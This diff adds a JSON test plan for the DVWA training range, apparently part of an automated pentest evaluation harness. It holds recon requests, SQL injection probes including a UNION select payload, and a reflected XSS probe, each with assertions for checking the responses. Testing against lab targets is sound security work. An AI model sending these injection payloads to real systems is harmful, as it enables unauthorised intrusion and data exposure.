@@ -1,0 +1,90 @@
+{
+  "_comment": [
+    "DVWA 靶场的技能执行计划。",
+    "",
+    "前置（由 eval/ranges/profiles.json 的 login 声明自动完成）：",
+    "  1) 带 CSRF token 登录 admin/password —— 不带 token 的 POST 会静默失败",
+    "  2) 把安全级别切到 low —— impossible 级别下各模块不可利用",
+    "适配器保持会话 cookie，故本文件里的请求无需再处理鉴权。",
+    "",
+    "判据标记取自实测（见 docs/靶场环境搭建.md）。",
+    "「报错」与「UNION 回显」两步都保留：前者证明参数未过滤，后者证明注入可利用。"
+  ],
+
+  "dvwa-recon-modules": {
+    "actions": [
+      { "method": "GET", "path": "/DVWA/index.php" },
+      { "method": "GET", "path": "/DVWA/vulnerabilities/sqli/", "query": { "id": "1", "Submit": "Submit" } }
+    ],
+    "verify": [
+      {
+        "kind": "body_contains",
+        "request": { "method": "GET", "path": "/DVWA/index.php" },
+        "assert": { "not_contains": ["login.php"] }
+      },
+      {
+        "kind": "body_contains",
+        "request": { "method": "GET", "path": "/DVWA/vulnerabilities/sqli/", "query": { "id": "1", "Submit": "Submit" } },
+        "assert": { "contains": ["First name: admin"] }
+      }
+    ],
+    "finding_kind": "endpoint-discovery",
+    "severity": "info",
+    "asset": "/DVWA/",
+    "discover_assets": [
+      { "kind": "endpoint", "value": "/DVWA/index.php" },
+      { "kind": "endpoint", "value": "/DVWA/vulnerabilities/sqli/?id=" },
+      { "kind": "endpoint", "value": "/DVWA/vulnerabilities/xss_r/?name=" }
+    ]
+  },
+
+  "dvwa-sqli-module": {
+    "actions": [
+      { "method": "GET", "path": "/DVWA/vulnerabilities/sqli/", "query": { "id": "1", "Submit": "Submit" } },
+      { "method": "GET", "path": "/DVWA/vulnerabilities/sqli/", "query": { "id": "1'", "Submit": "Submit" } },
+      { "method": "GET", "path": "/DVWA/vulnerabilities/sqli/", "query": { "id": "-1' union select 1,2#", "Submit": "Submit" } }
+    ],
+    "verify": [
+      {
+        "kind": "body_contains",
+        "request": { "method": "GET", "path": "/DVWA/vulnerabilities/sqli/", "query": { "id": "1", "Submit": "Submit" } },
+        "assert": { "contains": ["First name: admin"] }
+      },
+      {
+        "kind": "body_contains",
+        "request": { "method": "GET", "path": "/DVWA/vulnerabilities/sqli/", "query": { "id": "1'", "Submit": "Submit" } },
+        "assert": { "contains": ["You have an error in your SQL syntax"] }
+      },
+      {
+        "kind": "body_contains",
+        "request": { "method": "GET", "path": "/DVWA/vulnerabilities/sqli/", "query": { "id": "-1' union select 1,2#", "Submit": "Submit" } },
+        "assert": { "contains": ["First name: 1", "Surname: 2"] }
+      }
+    ],
+    "finding_kind": "sql-injection",
+    "severity": "high",
+    "asset": "/DVWA/vulnerabilities/sqli/?id="
+  },
+
+  "dvwa-xss-reflected": {
+    "actions": [
+      { "method": "GET", "path": "/DVWA/vulnerabilities/xss_r/", "query": { "name": "hiive_probe_7f3a", "Submit": "Submit" } },
+      { "method": "GET", "path": "/DVWA/vulnerabilities/xss_r/", "query": { "name": "<b>hiive_probe_7f3a</b>", "Submit": "Submit" } }
+    ],
+    "verify": [
+      {
+        "kind": "body_contains",
+        "request": { "method": "GET", "path": "/DVWA/vulnerabilities/xss_r/", "query": { "name": "hiive_probe_7f3a", "Submit": "Submit" } },
+        "assert": { "contains": ["hiive_probe_7f3a"] }
+      },
+      {
+        "kind": "body_contains",
+        "request": { "method": "GET", "path": "/DVWA/vulnerabilities/xss_r/", "query": { "name": "<b>hiive_probe_7f3a</b>", "Submit": "Submit" } },
+        "assert": { "contains": ["<b>hiive_probe_7f3a</b>"] }
+      }
+    ],
+    "finding_kind": "reflected-xss",
+    "severity": "medium",
+    "asset": "/DVWA/vulnerabilities/xss_r/?name="
+  }
+}
